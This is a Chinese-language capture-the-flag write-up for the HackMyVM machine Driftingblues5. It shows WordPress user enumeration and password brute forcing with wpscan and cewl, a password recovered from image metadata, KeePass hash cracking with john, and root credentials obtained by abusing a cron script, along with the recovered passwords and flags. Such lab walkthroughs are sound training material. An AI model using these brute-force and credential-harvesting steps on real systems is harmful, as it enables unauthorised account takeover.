# Driftingblues5

2024-11-09 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues5

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 web 上跑的是 wordpress，先枚举用户名,发现 4 个：

```
wpscan --url http://192.168.5.40/ -e u

[+] abuzerkomurcu
[+] gill
[+] collins
[+] satanic
[+] gadd
```

使用 cewl 搜集网页中可能存在的单词作为字典：

```
cewl -d 2 http://192.168.5.40/ -w passwd
```

使用 wpscan 进行爆破,找到一个可以登陆的用户名：

```
wpscan -t 30 -U user -P passwd --url http://192.168.5.40

SUCCESS] - gill / interchangeable
```

但是这个用户在 wordpress 中不是管理员权限，同时 ssh 也不能登陆。在 wp 的后台中进行查看看看是否有可用的信息，发现 media 中有一个图片 http://192.168.5.40/wp-content/uploads/2021/02/dblogo.png， exiftool dblogo.png 发现密码提示信息：

```
ssh password is 59583hello of course it is lowercase maybe not
```

尝试用上面得到的用户名和 59583hello 去 ssh 登陆，发现 gill 的密码是 59583hello

登陆后，得到了 user flag：

```
gill@driftingblues:~$ cat user.txt
F83FC7429857283616AE62F8B64143E6
```

寻找提升到 root 权限的路径，先读取 wp-config.php 中的数据库配置信息：

```
define( 'DB_NAME', 'wordpressdb' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', '.:.zurrak.:.' );
```

su root 使用上面这个密码没有切换成功。最后只发现了一个加密文件：

```
gill@driftingblues:~$ file keyfile.kdbx
keyfile.kdbx: Keepass password database 2.x KDBX
```

是个 keepass 加密的文件，将其传输到 kali 上，使用 john 进行破解：

```
keepass2john keyfile.kdbx > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

porsiempre       (keyfile)
```

得到密码后，在 keeweb 上上传 keyfile 然后在线解密 https://app.keeweb.info/ 输入密码 porsiempre，然后发现其中的内容：

```
2real4surreal
buddyretard
closet313
exalted
fracturedocean
zakkwylde
```

使用上面的密码对 root 进行 ssh 爆破，但是还是没有找到 root 的密码，

使用 linpeas 进行枚举，也没发现有其他信息，最后使用 pspy 看看有没有 root 的定时任务，发现每个一分钟就执行了一个脚本：

```
/bin/sh -c /root/key.sh
```

这个文件或许会修改某些文件，所以寻找最近修改的文件：

```
find / -type f -mtime -1 2>/dev/null |grep -v '/proc\|/run\|/sys'
```

发现 /home/gill/.gnupg 中的 pubring.kbx 改变了，同时根目录中有一个文件夹名字很奇怪 /keyfolder， 猜不出 /root/key.sh 中具体是什么操作，经过寻找解题思路，发现 /keyfolder 中存在唯一一个名为 fracturedocean 的文件时，就会创建 root 用户密码的文件，最终得到了 root 用户的密码：

```
gill@driftingblues:/keyfolder$ cat rootcreds.txt
root creds

imjustdrifting31
```

切换到 root 用户得到了 root flag：

```
9EFF53317826250071574B4D4EE56840
```
